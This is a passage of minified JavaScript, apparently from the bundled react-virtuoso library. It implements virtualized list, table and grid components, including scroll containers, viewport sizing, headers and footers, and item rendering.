		EmptyPlaceholder: i("EmptyPlaceholder"),
		FooterComponent: i("Footer"),
		GroupComponent: i("Group", "div"),
		groupContent: e,
		HeaderComponent: i("Header"),
		HeaderFooterTag: r,
		ItemComponent: i("Item", "div"),
		itemContent: t,
		ListComponent: i("List", "div"),
		ScrollerComponent: i("Scroller", "div"),
		scrollerRef: s,
		ScrollSeekPlaceholder: i("ScrollSeekPlaceholder"),
		TopItemListComponent: i("TopItemList")
	};
})));
var rr = ({ height: t }) => /* @__PURE__ */ jsx("div", { style: { height: t } });
var sr = {
	overflowAnchor: "none",
	position: Ze(),
	zIndex: 1
};
var no = { overflowAnchor: "none" };
var ir = {
	...no,
	display: "inline-block",
	height: "100%"
};
var Cn = /* @__PURE__ */ H.memo(function({ showTopList: e = !1 }) {
	const n = A("listState"), o = Ct("sizeRanges"), r = A("useWindowScroll"), s = A("customScrollParent"), i = Ct("windowScrollContainerState"), l = Ct("scrollContainerState"), c = s || r ? i : l, d = A("itemContent"), m = A("context"), x = A("groupContent"), p = A("trackItemSizes"), T = A("itemSize"), w = A("log"), R = Ct("gap"), h = A("horizontalDirection"), { callbackRef: f } = zn(o, T, p, e ? Xt : c, w, R, s, h, A("skipAnimationFrameInResizeObserver")), [a, S] = H.useState(0);
	tn("deviation", (F) => {
		a !== F && S(F);
	});
	const E = A("EmptyPlaceholder"), y = A("ScrollSeekPlaceholder") ?? rr, k = A("ListComponent"), u = A("ItemComponent"), g = A("GroupComponent"), C = A("computeItemKey"), z = A("isSeeking"), O = A("groupIndices").length > 0, V = A("alignToBottom"), N = A("initialItemFinalLocationReached"), Z = e ? {} : {
		boxSizing: "border-box",
		...h ? {
			display: "inline-block",
			height: "100%",
			marginLeft: a !== 0 ? a : V ? "auto" : 0,
			paddingLeft: n.offsetTop,
			paddingRight: n.offsetBottom,
			whiteSpace: "nowrap"
		} : {
			marginTop: a !== 0 ? a : V ? "auto" : 0,
			paddingBottom: n.offsetBottom,
			paddingTop: n.offsetTop
		},
		...N ? {} : { visibility: "hidden" }
	};
	return !e && n.totalCount === 0 && E !== null && E !== void 0 ? /* @__PURE__ */ jsx(E, { ...nt(E, m) }) : /* @__PURE__ */ jsx(k, {
		...nt(k, m),
		"data-testid": e ? "virtuoso-top-item-list" : "virtuoso-item-list",
		ref: f,
		style: Z,
		children: (e ? n.topItems : n.items).map((F) => {
			const mt = F.originalIndex, q = C(mt + n.firstItemIndex, F.data, m);
			return z ? /* @__PURE__ */ createElement(y, {
				...nt(y, m),
				height: F.size,
				index: F.index,
				key: q,
				type: F.type || "item",
				...F.type === "group" ? {} : { groupIndex: F.groupIndex }
			}) : F.type === "group" ? /* @__PURE__ */ createElement(g, {
				...nt(g, m),
				"data-index": mt,
				"data-item-index": F.index,
				"data-known-size": F.size,
				key: q,
				style: sr
			}, x(F.index, m)) : /* @__PURE__ */ createElement(u, {
				...nt(u, m),
				...oo(u, F.data),
				"data-index": mt,
				"data-item-group-index": F.groupIndex,
				"data-item-index": F.index,
				"data-known-size": F.size,
				key: q,
				style: h ? ir : no
			}, O ? d(F.index, F.groupIndex, F.data, m) : d(F.index, F.data, m));
		})
	});
});
var lr = {
	height: "100%",
	outline: "none",
	overflowY: "auto",
	position: "relative",
	WebkitOverflowScrolling: "touch"
};
var cr = {
	outline: "none",
	overflowX: "auto",
	position: "relative"
};
var Jt = (t) => ({
	height: "100%",
	position: "absolute",
	top: 0,
	width: "100%",
	...t ? {
		display: "flex",
		flexDirection: "column"
	} : void 0
});
var ur = {
	position: Ze(),
	top: 0,
	width: "100%",
	zIndex: 1
};
function nt(t, e) {
	if (typeof t != "string") return { context: e };
}
function oo(t, e) {
	return { item: typeof t == "string" ? void 0 : e };
}
var ar = /* @__PURE__ */ H.memo(function() {
	const e = A("HeaderComponent"), n = Ct("headerHeight"), o = A("HeaderFooterTag"), r = kt(H.useMemo(() => (i) => {
		n(Et(i, "height"));
	}, [n]), !0, A("skipAnimationFrameInResizeObserver")), s = A("context");
	return e != null ? /* @__PURE__ */ jsx(o, {
		ref: r,
		children: /* @__PURE__ */ jsx(e, { ...nt(e, s) })
	}) : null;
});
var dr = /* @__PURE__ */ H.memo(function() {
	const e = A("FooterComponent"), n = Ct("footerHeight"), o = A("HeaderFooterTag"), r = kt(H.useMemo(() => (i) => {
		n(Et(i, "height"));
	}, [n]), !0, A("skipAnimationFrameInResizeObserver")), s = A("context");
	return e != null ? /* @__PURE__ */ jsx(o, {
		ref: r,
		children: /* @__PURE__ */ jsx(e, { ...nt(e, s) })
	}) : null;
});
function Je({ useEmitter: t, useEmitterValue: e, usePublisher: n }) {
	return H.memo(function({ children: s, style: i, context: l, ...c }) {
		const d = n("scrollContainerState"), m = e("ScrollerComponent"), x = n("smoothScrollTargetReached"), p = e("scrollerRef"), T = e("horizontalDirection") || !1, { scrollByCallback: w, scrollerRef: R, scrollToCallback: h } = eo(d, x, m, p, void 0, T);
		return t("scrollTo", h), t("scrollBy", w), /* @__PURE__ */ jsx(m, {
			"data-testid": "virtuoso-scroller",
			"data-virtuoso-scroller": !0,
			ref: R,
			style: {
				...T ? cr : lr,
				...i
			},
			tabIndex: 0,
			...c,
			...nt(m, l),
			children: s
		});
	});
}
function Qe({ useEmitter: t, useEmitterValue: e, usePublisher: n }) {
	return H.memo(function({ children: s, style: i, context: l, ...c }) {
		const d = n("windowScrollContainerState"), m = e("ScrollerComponent"), x = n("smoothScrollTargetReached"), p = e("totalListHeight"), T = e("deviation"), w = e("customScrollParent"), R = H.useRef(null), { scrollByCallback: f, scrollerRef: a, scrollToCallback: S } = eo(d, x, m, e("scrollerRef"), w);
		return to(() => (a.current = w || R.current?.ownerDocument.defaultView, () => {
			a.current = null;
		}), [a, w]), t("windowScrollTo", S), t("scrollBy", f), /* @__PURE__ */ jsx(m, {
			ref: R,
			"data-virtuoso-scroller": !0,
			style: {
				position: "relative",
				...i,
				...p !== 0 ? { height: p + T } : void 0
			},
			...c,
			...nt(m, l),
			children: s
		});
	});
}
var fr = ({ children: t }) => {
	const e = H.useContext(Re), n = Ct("viewportHeight"), o = Ct("fixedItemHeight"), r = A("alignToBottom"), s = A("horizontalDirection"), l = kt(H.useMemo(() => re(n, (c) => Et(c, s ? "width" : "height")), [n, s]), !0, A("skipAnimationFrameInResizeObserver"));
	return H.useEffect(() => {
		e && (n(e.viewportHeight), o(e.itemHeight));
	}, [
		e,
		n,
		o
	]), /* @__PURE__ */ jsx("div", {
		"data-viewport-type": "element",
		ref: l,
		style: Jt(r),
		children: t
	});
}, mr = ({ children: t }) => {
	const e = H.useContext(Re), n = Ct("windowViewportRect"), o = Ct("fixedItemHeight"), s = Ne(n, A("customScrollParent"), A("skipAnimationFrameInResizeObserver")), i = A("alignToBottom");
	return H.useEffect(() => {
		e && (o(e.itemHeight), n({
			offsetTop: 0,
			visibleHeight: e.viewportHeight,
			visibleWidth: 100
		}));
	}, [
		e,
		n,
		o
	]), /* @__PURE__ */ jsx("div", {
		"data-viewport-type": "window",
		ref: s,
		style: Jt(i),
		children: t
	});
}, pr = ({ children: t }) => {
	const e = A("TopItemListComponent") ?? "div", n = A("headerHeight"), o = {
		...ur,
		marginTop: `${n}px`
	}, r = A("context");
	return /* @__PURE__ */ jsx(e, {
		style: o,
		...nt(e, r),
		children: t
	});
}, { Component: ro, useEmitter: tn, useEmitterValue: A, usePublisher: Ct } = /* @__PURE__ */ Ye(or, {
	optional: {
		restoreStateFrom: "restoreStateFrom",
		context: "context",
		followOutput: "followOutput",
		scrollIntoViewOnChange: "scrollIntoViewOnChange",
		itemContent: "itemContent",
		groupContent: "groupContent",
		overscan: "overscan",
		increaseViewportBy: "increaseViewportBy",
		minOverscanItemCount: "minOverscanItemCount",
		totalCount: "totalCount",
		groupCounts: "groupCounts",
		topItemCount: "topItemCount",
		firstItemIndex: "firstItemIndex",
		initialTopMostItemIndex: "initialTopMostItemIndex",
		components: "components",
		atBottomThreshold: "atBottomThreshold",
		atTopThreshold: "atTopThreshold",
		computeItemKey: "computeItemKey",
		defaultItemHeight: "defaultItemHeight",
		fixedGroupHeight: "fixedGroupHeight",
		fixedItemHeight: "fixedItemHeight",
		heightEstimates: "heightEstimates",
		itemSize: "itemSize",
		scrollSeekConfiguration: "scrollSeekConfiguration",
		headerFooterTag: "HeaderFooterTag",
		data: "data",
		initialItemCount: "initialItemCount",
		initialScrollTop: "initialScrollTop",
		alignToBottom: "alignToBottom",
		useWindowScroll: "useWindowScroll",
		customScrollParent: "customScrollParent",
		scrollerRef: "scrollerRef",
		logLevel: "logLevel",
		horizontalDirection: "horizontalDirection",
		skipAnimationFrameInResizeObserver: "skipAnimationFrameInResizeObserver"
	},
	methods: {
		scrollToIndex: "scrollToIndex",
		scrollIntoView: "scrollIntoView",
		scrollTo: "scrollTo",
		scrollBy: "scrollBy",
		autoscrollToBottom: "autoscrollToBottom",
		getState: "getState"
	},
	events: {
		isScrolling: "isScrolling",
		endReached: "endReached",
		startReached: "startReached",
		rangeChanged: "rangeChanged",
		atBottomStateChange: "atBottomStateChange",
		atTopStateChange: "atTopStateChange",
		totalListHeightChanged: "totalListHeightChanged",
		itemsRendered: "itemsRendered",
		groupIndices: "groupIndices"
	}
}, /* @__PURE__ */ H.memo(function(e) {
	const n = A("useWindowScroll"), o = A("topItemsIndexes").length > 0, r = A("customScrollParent"), s = A("context");
	return /* @__PURE__ */ jsxs(r || n ? Ir : gr, {
		...e,
		context: s,
		children: [o && /* @__PURE__ */ jsx(pr, { children: /* @__PURE__ */ jsx(Cn, { showTopList: !0 }) }), /* @__PURE__ */ jsxs(r || n ? mr : fr, { children: [
			/* @__PURE__ */ jsx(ar, {}),
			/* @__PURE__ */ jsx(Cn, {}),
			/* @__PURE__ */ jsx(dr, {})
		] })]
	});
})), gr = /* @__PURE__ */ Je({
	useEmitter: tn,
	useEmitterValue: A,
	usePublisher: Ct
}), Ir = /* @__PURE__ */ Qe({
	useEmitter: tn,
	useEmitterValue: A,
	usePublisher: Ct
}), qr = ro, Sr = /* @__PURE__ */ j(([t, e]) => ({
	...t,
	...e
}), ot(Jn, /* @__PURE__ */ j(() => {
	const t = v((d) => /* @__PURE__ */ jsxs("td", { children: ["Item $", d] })), e = v(null), n = v((d) => /* @__PURE__ */ jsxs("td", {
		colSpan: 1e3,
		children: ["Group ", d]
	})), o = v(null), r = v(null), s = v({}), i = v(Xe), l = v(Xt), c = (d, m = null) => ht(I(s, B((x) => x[d]), et()), m);
	return {
		components: s,
		computeItemKey: i,
		context: e,
		EmptyPlaceholder: c("EmptyPlaceholder"),
		FillerRow: c("FillerRow"),
		fixedFooterContent: r,
		fixedHeaderContent: o,
		itemContent: t,
		groupContent: n,
		ScrollerComponent: c("Scroller", "div"),
		scrollerRef: l,
		ScrollSeekPlaceholder: c("ScrollSeekPlaceholder"),
		TableBodyComponent: c("TableBody", "tbody"),
		TableComponent: c("Table", "table"),
		TableFooterComponent: c("TableFoot", "tfoot"),
		TableHeadComponent: c("TableHead", "thead"),
		TableRowComponent: c("TableRow", "tr"),
		GroupComponent: c("Group", "tr")
	};
}))), Tr = ({ height: t }) => /* @__PURE__ */ jsx("tr", { children: /* @__PURE__ */ jsx("td", { style: { height: t } }) }), vr = ({ height: t }) => /* @__PURE__ */ jsx("tr", { children: /* @__PURE__ */ jsx("td", { style: {
	border: 0,
	height: t,
	padding: 0
} }) }), Cr = { overflowAnchor: "none" }, wn = {
	position: Ze(),
	zIndex: 2,
	overflowAnchor: "none"
}, yn = /* @__PURE__ */ H.memo(function({ showTopList: e = !1 }) {
	const n = M("listState"), o = M("computeItemKey"), r = M("firstItemIndex"), s = M("context"), i = M("isSeeking"), l = M("fixedHeaderHeight"), c = M("groupIndices").length > 0, d = M("itemContent"), m = M("groupContent"), x = M("ScrollSeekPlaceholder") ?? Tr, p = M("GroupComponent"), T = M("TableRowComponent"), w = (e ? n.topItems : []).reduce((h, f, a) => (a === 0 ? h.push(f.size) : h.push(h[a - 1] + f.size), h), []);
	return (e ? n.topItems : n.items).map((h) => {
		const f = h.originalIndex, a = o(f + r, h.data, s), S = e ? f === 0 ? 0 : w[f - 1] : 0;
		return i ? /* @__PURE__ */ createElement(x, {
			...nt(x, s),
			height: h.size,
			index: h.index,
			key: a,
			type: h.type || "item"
		}) : h.type === "group" ? /* @__PURE__ */ createElement(p, {
			...nt(p, s),
			"data-index": f,
			"data-item-index": h.index,
			"data-known-size": h.size,
			key: a,
			style: {
				...wn,
				top: l
			}
		}, m(h.index, s)) : /* @__PURE__ */ createElement(T, {
			...nt(T, s),
			...oo(T, h.data),
			"data-index": f,
			"data-item-index": h.index,
			"data-known-size": h.size,
			"data-item-group-index": h.groupIndex,
			key: a,
			style: e ? {
				...wn,
				top: l + S
			} : Cr
		}, c ? d(h.index, h.groupIndex, h.data, s) : d(h.index, h.data, s));
	});
}), wr = /* @__PURE__ */ H.memo(function() {
	const e = M("listState"), n = M("topItemsIndexes").length > 0, o = bt("sizeRanges"), r = M("useWindowScroll"), s = M("customScrollParent"), i = bt("windowScrollContainerState"), l = bt("scrollContainerState"), c = s || r ? i : l, d = M("trackItemSizes"), { callbackRef: p, ref: T } = zn(o, M("itemSize"), d, c, M("log"), void 0, s, !1, M("skipAnimationFrameInResizeObserver")), [w, R] = H.useState(0);
	en("deviation", (O) => {
		w !== O && (T.current.style.marginTop = `${O}px`, R(O));
	});
	const h = M("EmptyPlaceholder"), f = M("FillerRow") ?? vr, a = M("TableBodyComponent"), S = M("paddingTopAddition"), E = M("statefulTotalCount"), y = M("context");
	if (E === 0 && h !== null && h !== void 0) return /* @__PURE__ */ jsx(h, { ...nt(h, y) });
	const k = (n ? e.topItems : []).reduce((O, V) => O + V.size, 0), u = e.offsetTop + S + w - k, g = e.offsetBottom, C = u > 0 ? /* @__PURE__ */ jsx(f, {
		context: y,
		height: u
	}, "padding-top") : null, z = g > 0 ? /* @__PURE__ */ jsx(f, {
		context: y,
		height: g
	}, "padding-bottom") : null;
	return /* @__PURE__ */ jsxs(a, {
		"data-testid": "virtuoso-item-list",
		ref: p,
		...nt(a, y),
		children: [
			C,
			n && /* @__PURE__ */ jsx(yn, { showTopList: !0 }),
			/* @__PURE__ */ jsx(yn, {}),
			z
		]
	});
}), yr = ({ children: t }) => {
	const e = H.useContext(Re), n = bt("viewportHeight"), o = bt("fixedItemHeight"), r = kt(H.useMemo(() => re(n, (s) => Et(s, "height")), [n]), !0, M("skipAnimationFrameInResizeObserver"));
	return H.useEffect(() => {
		e && (n(e.viewportHeight), o(e.itemHeight));
	}, [
		e,
		n,
		o
	]), /* @__PURE__ */ jsx("div", {
		"data-viewport-type": "element",
		ref: r,
		style: Jt(!1),
		children: t
	});
}, br = ({ children: t }) => {
	const e = H.useContext(Re), n = bt("windowViewportRect"), o = bt("fixedItemHeight"), s = Ne(n, M("customScrollParent"), M("skipAnimationFrameInResizeObserver"));
	return H.useEffect(() => {
		e && (o(e.itemHeight), n({
			offsetTop: 0,
			visibleHeight: e.viewportHeight,
			visibleWidth: 100
		}));
	}, [
		e,
		n,
		o
	]), /* @__PURE__ */ jsx("div", {
		"data-viewport-type": "window",
		ref: s,
		style: Jt(!1),
		children: t
	});
}, { Component: so, useEmitter: en, useEmitterValue: M, usePublisher: bt } = /* @__PURE__ */ Ye(Sr, {
	optional: {
		restoreStateFrom: "restoreStateFrom",
		context: "context",
		followOutput: "followOutput",
		firstItemIndex: "firstItemIndex",
		itemContent: "itemContent",
		groupContent: "groupContent",
		fixedHeaderContent: "fixedHeaderContent",
		fixedFooterContent: "fixedFooterContent",
		overscan: "overscan",
		increaseViewportBy: "increaseViewportBy",
		minOverscanItemCount: "minOverscanItemCount",
		totalCount: "totalCount",
		topItemCount: "topItemCount",
		initialTopMostItemIndex: "initialTopMostItemIndex",
		components: "components",
		groupCounts: "groupCounts",
		atBottomThreshold: "atBottomThreshold",
		atTopThreshold: "atTopThreshold",
		computeItemKey: "computeItemKey",
		defaultItemHeight: "defaultItemHeight",
		fixedGroupHeight: "fixedGroupHeight",
		fixedItemHeight: "fixedItemHeight",
		itemSize: "itemSize",
		scrollSeekConfiguration: "scrollSeekConfiguration",
		data: "data",
		initialItemCount: "initialItemCount",
		initialScrollTop: "initialScrollTop",
		alignToBottom: "alignToBottom",
		useWindowScroll: "useWindowScroll",
		customScrollParent: "customScrollParent",
		scrollerRef: "scrollerRef",
		logLevel: "logLevel"
	},
	methods: {
		scrollToIndex: "scrollToIndex",
		scrollIntoView: "scrollIntoView",
		scrollTo: "scrollTo",
		scrollBy: "scrollBy",
		getState: "getState"
	},
	events: {
		isScrolling: "isScrolling",
		endReached: "endReached",
		startReached: "startReached",
		rangeChanged: "rangeChanged",
		atBottomStateChange: "atBottomStateChange",
		atTopStateChange: "atTopStateChange",
		totalListHeightChanged: "totalListHeightChanged",
		itemsRendered: "itemsRendered",
		groupIndices: "groupIndices"
	}
}, /* @__PURE__ */ H.memo(function(e) {
	const n = M("useWindowScroll"), o = M("customScrollParent"), r = bt("fixedHeaderHeight"), s = bt("fixedFooterHeight"), i = M("fixedHeaderContent"), l = M("fixedFooterContent"), c = M("context"), d = kt(H.useMemo(() => re(r, (a) => Et(a, "height")), [r]), !0, M("skipAnimationFrameInResizeObserver")), m = kt(H.useMemo(() => re(s, (a) => Et(a, "height")), [s]), !0, M("skipAnimationFrameInResizeObserver")), x = o || n ? Hr : Er, p = o || n ? br : yr, T = M("TableComponent"), w = M("TableHeadComponent"), R = M("TableFooterComponent"), h = i ? /* @__PURE__ */ jsx(w, {
		ref: d,
		style: {
			position: "sticky",
			top: 0,
			zIndex: 2
		},
		...nt(w, c),
		children: i()
	}, "TableHead") : null, f = l ? /* @__PURE__ */ jsx(R, {
		ref: m,
		style: {
			bottom: 0,
			position: "sticky",
			zIndex: 1
		},
		...nt(R, c),
		children: l()
	}, "TableFoot") : null;
	return /* @__PURE__ */ jsx(x, {
		...e,
		...nt(x, c),
		children: /* @__PURE__ */ jsx(p, { children: /* @__PURE__ */ jsxs(T, {
			style: {
				borderSpacing: 0,
				overflowAnchor: "none"
			},
			...nt(T, c),
			children: [
				h,
				/* @__PURE__ */ jsx(wr, {}, "TableBody"),
				f
			]
		}) })
	});
})), Er = /* @__PURE__ */ Je({
	useEmitter: en,
	useEmitterValue: M,
	usePublisher: bt
}), Hr = /* @__PURE__ */ Qe({
	useEmitter: en,
	useEmitterValue: M,
	usePublisher: bt
}), bn = {
	bottom: 0,
	itemHeight: 0,
	items: [],
	itemWidth: 0,
	offsetBottom: 0,
	offsetTop: 0,
	top: 0
}, Br = {
	bottom: 0,
	itemHeight: 0,
	items: [{ index: 0 }],
	itemWidth: 0,
	offsetBottom: 0,
	offsetTop: 0,
	top: 0
}, { ceil: Rn, floor: Ce, max: oe, min: Le, round: En } = Math;
function Hn(t, e, n) {
	return Array.from({ length: e - t + 1 }).map((o, r) => ({
		data: n === null ? null : n[r + t],
		index: r + t
	}));
}
function Or(t) {
	return {
		...Br,
		items: t
	};
}
function xe(t, e) {
	return t !== void 0 && t.width === e.width && t.height === e.height;
}
function kr(t, e) {
	return t !== void 0 && t.column === e.column && t.row === e.row;
}
var Lr = /* @__PURE__ */ j(([{ increaseViewportBy: t, listBoundary: e, overscan: n, visibleRange: o }, { footerHeight: r, headerHeight: s, scrollBy: i, scrollContainerState: l, scrollTo: c, scrollTop: d, smoothScrollTargetReached: m, viewportHeight: x }, p, T, { didMount: w, propsReady: R }, { customScrollParent: h, useWindowScroll: f, windowScrollContainerState: a, windowScrollTo: S, windowViewportRect: E }, y]) => {
	const k = v(0), u = v(0), g = v(bn), C = v({
		height: 0,
		width: 0
	}), z = v({
		height: 0,
		width: 0
	}), O = U(), V = U(), N = v(0), Z = v(null), F = v({
		column: 0,
		row: 0
	}), mt = U(), q = U(), Q = v(!1), gt = v(0), ut = v(!0), xt = v(!1), Ft = v(!1);
	Y(I(w, $(gt), W(([b, D]) => D !== 0)), () => {
		_(ut, !1);
	}), Y(I(at(w, ut, z, C, gt, xt), W(([b, D, K, rt, , tt]) => b && !D && K.height !== 0 && rt.height !== 0 && !tt)), ([, , , , b]) => {
		_(xt, !0), Ue(1, () => {
			_(O, b);
		}), yt(I(d), () => {
			_(e, [0, 0]), _(ut, !0);
		});
	}), L(I(q, W((b) => b != null && b.scrollTop > 0), Bt(0)), u), Y(I(w, $(q), W(([, b]) => b != null)), ([, b]) => {
		b && (_(C, b.viewport), _(z, b.item), _(F, b.gap), b.scrollTop > 0 && (_(Q, !0), yt(I(d, $t(1)), (D) => {
			_(Q, !1);
		}), _(c, { top: b.scrollTop })));
	}), L(I(C, B(({ height: b }) => b)), x), L(I(at(P(C, xe), P(z, xe), P(F, (b, D) => b !== void 0 && b.column === D.column && b.row === D.row), P(d)), B(([b, D, K, rt]) => ({
		gap: K,
		item: D,
		scrollTop: rt,
		viewport: b
	}))), mt), L(I(at(P(k), o, P(F, kr), P(z, xe), P(C, xe), P(Z), P(u), P(Q), P(ut), P(gt)), W(([, , , , , , , b]) => !b), B(([b, [D, K], rt, tt, X, lt, St, , ct, Vt]) => {
		const { column: Pt, row: ee } = rt, { height: he, width: Ee } = tt, { width: nn } = X;
		if (St === 0 && (b === 0 || nn === 0)) return bn;
		if (Ee === 0) {
			const cn = Ke(Vt, b);
			return Or(Hn(cn, cn + Math.max(St - 1, 0), lt));
		}
		const ge = io(nn, Ee, Pt);
		let jt, Mt;
		ct ? D === 0 && K === 0 && St > 0 ? (jt = 0, Mt = St - 1) : (jt = ge * Ce((D + ee) / (he + ee)), Mt = ge * Rn((K + ee) / (he + ee)) - 1, Mt = Le(b - 1, oe(Mt, ge - 1)), jt = Le(Mt, oe(0, jt))) : (jt = 0, Mt = -1);
		const on = Hn(jt, Mt, lt), { bottom: rn, top: sn } = Bn(X, rt, tt, on), ln = Rn(b / ge);
		return {
			bottom: rn,
			itemHeight: he,
			items: on,
			itemWidth: Ee,
			offsetBottom: ln * he + (ln - 1) * ee - rn,
			offsetTop: sn,
			top: sn
		};
	})), g), L(I(Z, W((b) => b !== null), B((b) => b.length)), k), L(I(at(C, z, g, F), W(([b, D, { items: K }]) => K.length > 0 && D.height !== 0 && b.height !== 0), B(([b, D, { items: K }, rt]) => {
		const { bottom: tt, top: X } = Bn(b, rt, D, K);
		return [X, tt];
	}), et(le)), e);
	const pt = v(!1);
	L(I(d, $(pt), B(([b, D]) => D || b !== 0)), pt);
	const Kt = vt(I(at(g, k), W(([{ items: b }]) => b.length > 0), $(pt), W(([[b, D], K]) => {
		const tt = b.items[b.items.length - 1].index === D - 1;
		return (K || b.bottom > 0 && b.itemHeight > 0 && b.offsetBottom === 0 && b.items.length === D) && tt;
	}), B(([[, b]]) => b - 1), et())), Qt = vt(I(P(g), W(({ items: b }) => b.length > 0 && b[0].index === 0), Bt(0), et())), Ht = vt(I(P(g), $(Q), W(([{ items: b }, D]) => b.length > 0 && !D), B(([{ items: b }]) => ({
		endIndex: b[b.length - 1].index,
		startIndex: b[0].index
	})), et(An), zt(0)));
	L(Ht, T.scrollSeekRangeChanged), L(I(O, $(C, z, k, F), B(([b, D, K, rt, tt]) => {
		const X = $n(b), { align: lt, behavior: St, offset: ct } = X;
		let Vt = X.index;
		Vt === "LAST" && (Vt = rt - 1), Vt = oe(0, Vt, Le(rt - 1, Vt));
		let Pt = Ge(D, tt, K, Vt);
		return lt === "end" ? Pt = En(Pt - D.height + K.height) : lt === "center" && (Pt = En(Pt - D.height / 2 + K.height / 2)), ct !== void 0 && ct !== 0 && (Pt += ct), {
			behavior: St,
			top: Pt
		};
	})), c);
	const te = ht(I(g, B((b) => b.offsetBottom + b.bottom)), 0);
	return L(I(E, B((b) => ({
		height: b.visibleHeight,
		width: b.visibleWidth
	}))), C), {
		customScrollParent: h,
		data: Z,
		deviation: N,
		footerHeight: r,
		gap: F,
		headerHeight: s,
		increaseViewportBy: t,
		initialItemCount: u,
		itemDimensions: z,
		overscan: n,
		restoreStateFrom: q,
		scrollBy: i,
		scrollContainerState: l,
		scrollHeight: V,
		scrollTo: c,
		scrollToIndex: O,
		scrollTop: d,
		smoothScrollTargetReached: m,
		totalCount: k,
		useWindowScroll: f,
		viewportDimensions: C,
		windowScrollContainerState: a,
		windowScrollTo: S,
		windowViewportRect: E,
		...T,
		gridState: g,
		horizontalDirection: Ft,
		initialTopMostItemIndex: gt,
		totalListHeight: te,
		...p,
		endReached: Kt,
		propsReady: R,
		rangeChanged: Ht,
		startReached: Qt,
		stateChanged: mt,
		stateRestoreInProgress: Q,
		...y
	};
}, ot(je, It, pe, Zn, At, qe, Gt));
function io(t, e, n) {
	return oe(1, Ce((t + n) / (Ce(e) + n)));
}
function Bn(t, e, n, o) {
	const { height: r } = n;
	if (r === void 0 || o.length === 0) return {
		bottom: 0,
		top: 0
	};
	const s = Ge(t, e, n, o[0].index);
	return {
		bottom: Ge(t, e, n, o[o.length - 1].index) + r,
		top: s
	};
}
function Ge(t, e, n, o) {
	const s = Ce(o / io(t.width, n.width, e.column)), i = s * n.height + oe(0, s - 1) * e.row;
	return i > 0 ? i + e.row : i;
}
var Fr = /* @__PURE__ */ j(([t, e]) => ({
	...t,
	...e
}), ot(Lr, /* @__PURE__ */ j(() => {
	const t = v((x) => `Item ${x}`), e = v({}), n = v(null), o = v("virtuoso-grid-item"), r = v("virtuoso-grid-list"), s = v(Xe), i = v("div"), l = v(Xt), c = (x, p = null) => ht(I(e, B((T) => T[x]), et()), p), d = v(!1), m = v(!1);
	return L(P(m), d), {
		components: e,
		computeItemKey: s,
		context: n,
		FooterComponent: c("Footer"),
		HeaderComponent: c("Header"),
		headerFooterTag: i,
		itemClassName: o,
		ItemComponent: c("Item", "div"),
		itemContent: t,
		listClassName: r,
		ListComponent: c("List", "div"),
		readyStateChanged: d,
		reportReadyState: m,
		ScrollerComponent: c("Scroller", "div"),
		scrollerRef: l,
		ScrollSeekPlaceholder: c("ScrollSeekPlaceholder", "div")
	};
}))), Vr = /* @__PURE__ */ H.memo(function() {
	const e = st("gridState"), n = st("listClassName"), o = st("itemClassName"), r = st("itemContent"), s = st("computeItemKey"), i = st("isSeeking"), l = wt("scrollHeight"), c = st("ItemComponent"), d = st("ListComponent"), m = st("ScrollSeekPlaceholder"), x = st("context"), p = wt("itemDimensions"), T = wt("gap"), w = st("log"), R = st("stateRestoreInProgress"), h = wt("reportReadyState"), f = kt(H.useMemo(() => (a) => {
		const S = a.parentElement.parentElement.scrollHeight;
		l(S);
		const E = a.firstChild;
		if (E !== null) {
			const { height: y, width: k } = E.getBoundingClientRect();
			p({
				height: y,
				width: k
			});
		}
		T({
			column: On("column-gap", getComputedStyle(a).columnGap, w),
			row: On("row-gap", getComputedStyle(a).rowGap, w)
		});
	}, [
		l,
		p,
		T,
		w
	]), !0, !1);
	return to(() => {
		e.itemHeight > 0 && e.itemWidth > 0 && h(!0);
	}, [e]), R ? null : /* @__PURE__ */ jsx(d, {
		className: n,
		ref: f,
		...nt(d, x),
		"data-testid": "virtuoso-item-list",
		style: {
			paddingBottom: e.offsetBottom,
			paddingTop: e.offsetTop
		},
		children: e.items.map((a) => {
			const S = s(a.index, a.data, x);
			return i ? /* @__PURE__ */ jsx(m, {
				...nt(m, x),
				height: e.itemHeight,
				index: a.index,
				width: e.itemWidth
			}, S) : /* @__PURE__ */ createElement(c, {
				...nt(c, x),
				className: o,
				"data-index": a.index,
				key: S
			}, r(a.index, a.data, x));
		})
	});
}), Pr = H.memo(function() {
	const e = st("HeaderComponent"), n = wt("headerHeight"), o = st("headerFooterTag"), r = kt(H.useMemo(() => (i) => {
		n(Et(i, "height"));
	}, [n]), !0, !1), s = st("context");
	return e != null ? /* @__PURE__ */ jsx(o, {
		ref: r,
		children: /* @__PURE__ */ jsx(e, { ...nt(e, s) })
	}) : null;
}), Wr = H.memo(function() {
	const e = st("FooterComponent"), n = wt("footerHeight"), o = st("headerFooterTag"), r = kt(H.useMemo(() => (i) => {
		n(Et(i, "height"));
	}, [n]), !0, !1), s = st("context");
	return e != null ? /* @__PURE__ */ jsx(o, {
		ref: r,
		children: /* @__PURE__ */ jsx(e, { ...nt(e, s) })
	}) : null;
}), Gr = ({ children: t }) => {
	const e = H.useContext(Qn), n = wt("itemDimensions"), o = wt("viewportDimensions"), r = kt(H.useMemo(() => (s) => {
		o(s.getBoundingClientRect());
	}, [o]), !0, !1);
	return H.useEffect(() => {
		e && (o({
			height: e.viewportHeight,
			width: e.viewportWidth
		}), n({
			height: e.itemHeight,
			width: e.itemWidth
		}));
	}, [
		e,
		o,
		n
	]), /* @__PURE__ */ jsx("div", {
		ref: r,
		style: Jt(!1),
		children: t
	});
}, Ar = ({ children: t }) => {
	const e = H.useContext(Qn), n = wt("windowViewportRect"), o = wt("itemDimensions"), s = Ne(n, st("customScrollParent"), !1);
	return H.useEffect(() => {
		e && (o({
			height: e.itemHeight,
			width: e.itemWidth
		}), n({
			offsetTop: 0,
			visibleHeight: e.viewportHeight,
			visibleWidth: e.viewportWidth
		}));
	}, [
		e,
		n,
		o
	]), /* @__PURE__ */ jsx("div", {
		ref: s,
		style: Jt(!1),
		children: t
	});
}, { Component: _r, useEmitter: lo, useEmitterValue: st, usePublisher: wt } = /* @__PURE__ */ Ye(Fr, {
	optional: {
		context: "context",
		totalCount: "totalCount",
		overscan: "overscan",
		itemContent: "itemContent",
		components: "components",
		computeItemKey: "computeItemKey",
		data: "data",
		initialItemCount: "initialItemCount",
		scrollSeekConfiguration: "scrollSeekConfiguration",
		headerFooterTag: "headerFooterTag",
		listClassName: "listClassName",
		itemClassName: "itemClassName",
		useWindowScroll: "useWindowScroll",
		customScrollParent: "customScrollParent",
		scrollerRef: "scrollerRef",
		logLevel: "logLevel",
